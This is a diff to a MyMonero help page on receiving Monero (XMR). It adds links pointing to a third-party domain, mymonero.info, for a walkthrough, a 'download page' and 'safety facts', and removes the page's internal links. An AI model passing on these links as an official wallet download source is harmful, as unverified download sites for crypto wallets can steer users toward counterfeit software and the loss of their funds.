@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 To receive XMR, copy the receiving address from the wallet you intend to use and share only that address with the sender. Verify it before sending, and never provide your recovery seed or private keys to receive a payment.
 
+
+For a second walkthrough, see [MyMonero how to use mymonero on mymonero.info](https://mymonero.info/how-to-use-mymonero). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [MyMonero safety facts](https://mymonero.info/is-mymonero-safe).
+
 ## You'll see this if
 - Someone is about to send you XMR and asks for a destination.
 - You are unsure which wallet address to provide.
@@ -40,8 +43,8 @@ MyMonero desktop's final release is v1.3.3, available as Windows .exe, macOS .dm
 3. **Verify the copied value.** Compare the pasted address with the one displayed in the wallet, including its beginning and ending characters. Malware or other unwanted software can alter clipboard contents, so stop if the values do not match. Do not share screenshots that expose private wallet details.
 4. **Send only the address to the payer.** Use a communication channel you trust and make clear that the payment is XMR. Never send recovery words, private keys, login credentials, or a wallet file. Nobody legitimate needs them to make a payment.
 5. **Ask the sender to verify before submitting.** The sender should confirm the address and asset in their own wallet or service. If the transfer comes from an exchange, they should follow that exchange's current withdrawal requirements. A payment from an exchange may have processing steps separate from the wallet.
-6. **Wait for the wallet to scan.** Keep MyMonero open and allow activity to update. If the wallet appears stale, check [MyMonero not syncing](./mymonero-not-syncing.md). Error 523 is general guidance that a server connection is unavailable, not proof of a problem with your address.
-7. **Check incoming status and available amount.** Review transaction history after scanning. Funds may be pending or locked and not yet spendable. Check [why MyMonero spendable balance is low](./mymonero-spendable-balance-low.md) if the received amount cannot immediately be sent onward.
+6. **Wait for the wallet to scan.** Keep MyMonero open and allow activity to update. If the wallet appears stale, check MyMonero not syncing. Error 523 is general guidance that a server connection is unavailable, not proof of a problem with your address.
+7. **Check incoming status and available amount.** Review transaction history after scanning. Funds may be pending or locked and not yet spendable. Check why MyMonero spendable balance is low if the received amount cannot immediately be sent onward.
 8. **Record the payment privately.** Keep the amount, date, and transaction details in a secure place if needed. Avoid posting transaction identifiers with personal details or exposing wallet information publicly.
 
 > [!WARNING]
@@ -49,7 +52,7 @@ MyMonero desktop's final release is v1.3.3, available as Windows .exe, macOS .dm
 
 ---
 ## If that did not work
-If no transaction appears, confirm that the sender submitted the transfer and used the exact address you provided. Then allow the wallet scan to update. For a restored wallet, check that you selected the correct seed format and an appropriate restore height. MyMonero seeds may be 13-word MyMonero-specific legacy seeds or 25-word standard Monero seeds; see [seed format differences](./mymonero-seed-13-vs-25-words.md).
+If no transaction appears, confirm that the sender submitted the transfer and used the exact address you provided. Then allow the wallet scan to update. For a restored wallet, check that you selected the correct seed format and an appropriate restore height. MyMonero seeds may be 13-word MyMonero-specific legacy seeds or 25-word standard Monero seeds; see seed format differences.
 
 If the wallet's total balance changes but the amount available does not, allow pending or locked funds to update. For exchange withdrawals, the exchange's transaction status and MyMonero's wallet display are separate. Do not request a second payment until you understand the first transfer's status.
 
@@ -92,6 +95,7 @@ MyMonero hosted servers and web wallet login stopped. The final desktop release 
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
